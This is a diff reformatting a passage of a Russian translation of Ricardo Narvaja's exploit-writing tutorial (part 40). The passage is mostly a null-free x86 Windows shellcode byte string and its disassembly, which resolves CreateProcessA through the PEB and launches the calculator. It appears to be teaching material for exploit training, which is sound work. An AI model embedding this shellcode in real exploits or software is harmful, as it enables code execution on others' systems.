@@ -23,42 +23,43 @@ shellcode=
 
 Сами байты эксплоита такие:
 
-**31 db 64 8b 7b 30 8b 7f 0c 8b 7f 1c 8b 47 08 8b 77 20 8b 3f 80 7e 0c 33 75 f2 89 c7 03 78 3c 8b" 57 78 01 c2 8b 7a 20 01 c7 89 dd 8b 34 af 01 c6 45 81 3e 43 72 65 61 75 f2 81 7e 08 6f 63 65 73 75 e9 8b 7a 24 01 c7 66 8b 2c 6f 8b 7a 1c 01 c7 8b 7c af fc 01 c7 89 d9 b1 ff 53 e2 fd 68 63 61 6c 63 89 e2 52 52 53 53 53 53 53 53 52 53 ff d7**
+`31 db 64 8b 7b 30 8b 7f 0c 8b 7f 1c 8b 47 08 8b 77 20 8b 3f 80 7e 0c 33 75 f2 89 c7 03 78 3c 8b" 57 78 01 c2 8b 7a 20 01 c7 89 dd 8b 34 af 01 c6 45 81 3e 43 72 65 61 75 f2 81 7e 08 6f 63 65 73 75 e9 8b 7a 24 01 c7 66 8b 2c 6f 8b 7a 1c 01 c7 8b 7c af fc 01 c7 89 d9 b1 ff 53 e2 fd 68 63 61 6c 63 89 e2 52 52 53 53 53 53 53 53 52 53 ff d7`
 
-**MOV EDI,DWORD PTR FS:\[EBX+30\]
+```assembly
+MOV EDI,DWORD PTR FS:[EBX+30]
 XOR EBX,EBX
-MOV EDI,DWORD PTR DS:\[EDI+C\]
-MOV EDI,DWORD PTR DS:\[EDI+1C\]
-MOV EAX,DWORD PTR DS:\[EDI+8\]
-MOV ESI,DWORD PTR DS:\[EDI+20\]
-MOV EDI,DWORD PTR DS:\[EDI\]
-CMP BYTE PTR DS:\[ESI+C\],33
-JNZ SHORT CANARY\_c.00A7138A
+MOV EDI,DWORD PTR DS:[EDI+C]
+MOV EDI,DWORD PTR DS:[EDI+1C]
+MOV EAX,DWORD PTR DS:[EDI+8]
+MOV ESI,DWORD PTR DS:[EDI+20]
+MOV EDI,DWORD PTR DS:[EDI]
+CMP BYTE PTR DS:[ESI+C],33
+JNZ SHORT CANARY_c.00A7138A
 MOV EDI,EAX
-ADD EDI,DWORD PTR DS:\[EAX+3C\]
-MOV EDX,DWORD PTR DS:\[EDI+78\]
+ADD EDI,DWORD PTR DS:[EAX+3C]
+MOV EDX,DWORD PTR DS:[EDI+78]
 ADD EDX,EAX
-MOV EDI,DWORD PTR DS:\[EDX+20\]
+MOV EDI,DWORD PTR DS:[EDX+20]
 ADD EDI,EAX
 MOV EBP,EBX
-MOV ESI,DWORD PTR DS:\[EDI+EBP\*4\]
+MOV ESI,DWORD PTR DS:[EDI+EBP*4]
 ADD ESI,EAX
 INC EBP
-CMP DWORD PTR DS:\[ESI\],61657243
-JNZ SHORT CANARY\_c.00A713A9
-CMP DWORD PTR DS:\[ESI+8\],7365636F
-JNZ SHORT CANARY\_c.00A713A9
-MOV EDI,DWORD PTR DS:\[EDX+24\]
+CMP DWORD PTR DS:[ESI],61657243
+JNZ SHORT CANARY_c.00A713A9
+CMP DWORD PTR DS:[ESI+8],7365636F
+JNZ SHORT CANARY_c.00A713A9
+MOV EDI,DWORD PTR DS:[EDX+24]
 ADD EDI,EAX
-MOV BP,WORD PTR DS:\[EDI+EBP\*2\]
-MOV EDI,DWORD PTR DS:\[EDX+1C\]
+MOV BP,WORD PTR DS:[EDI+EBP*2]
+MOV EDI,DWORD PTR DS:[EDX+1C]
 ADD EDI,EAX
-MOV EDI,DWORD PTR DS:\[EDI+EBP\*4-4\]
+MOV EDI,DWORD PTR DS:[EDI+EBP*4-4]
 ADD EDI,EAX
 MOV ECX,EBX
 MOV CL,0FF
 PUSH EBX
-LOOPD SHORT CANARY\_c.00A713D8
+LOOPD SHORT CANARY_c.00A713D8
 PUSH 636C6163
 MOV EDX,ESP
 PUSH EDX
@@ -71,7 +72,8 @@ PUSH EBX
 PUSH EBX
 PUSH EDX
 PUSH EBX
-CALL EDI**
+CALL EDI
+```
 
 Эти байты запускают калькулятор везде где мы их вставляем. Хорошо, что у этих байтов нет нулей. Хотя могут быть программы, который отвергают какой-то конкретный символ отличный от нуля. Это будет зависеть от случая.
 
@@ -111,7 +113,7 @@ CALL EDI**
 
 До следующей части **41**. Практикуйте и находите решение.
 
-**=======================================================
+* * *
 Автор текста: Рикардо Нарваха** - **Ricardo** **Narvaja** \(**@ricnar456**\)
 Перевод на английский: **IvinsonCLS \(@IvinsonCLS\)**
 Перевод на русский с испанского+английского: **Яша\_Добрый\_Хакер\(Ростовский фанат Нарвахи\).**
